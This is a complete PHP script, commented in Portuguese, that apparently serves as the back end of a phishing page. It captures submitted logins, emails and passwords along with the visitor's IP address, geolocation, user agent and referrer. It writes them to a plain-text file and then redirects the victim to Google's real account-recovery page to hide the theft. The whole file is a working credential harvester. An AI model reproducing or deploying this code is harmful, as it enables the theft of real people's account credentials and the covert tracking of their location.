<?php

$ip = $_SERVER['REMOTE_ADDR'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$referrer = $_SERVER['HTTP_REFERER'] ?? 'N/A';
$dataHora = date("Y-m-d H:i:s");

// Coleta dos campos do formulário
$login = $_POST['login'];
$email = $_POST['email'];
$senha = $_POST['senha'];

// Requisição à API de geolocalização via IP
$geo = @json_decode(file_get_contents("http://ip-api.com/json/$ip?lang=pt"), true);
$pais = $geo['country'] ?? 'Desconhecido';
$cidade = $geo['city'] ?? 'Desconhecida';
$regiao = $geo['regionName'] ?? 'Desconhecida';
$isp = $geo['isp'] ?? 'Desconhecido';

// Registro concatenado no estilo original
$log = "Login: $login | Email: $email | Senha: $senha | IP: $ip | Cidade: $cidade | Região: $regiao | País: $pais | ISP: $isp | Agente: $useragent | Referrer: $referrer | Data/Hora: $dataHora\n";

// Salvando em arquivo
file_put_contents("logins.txt", $log, FILE_APPEND);

// Redirecionamento
header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
exit();

?>
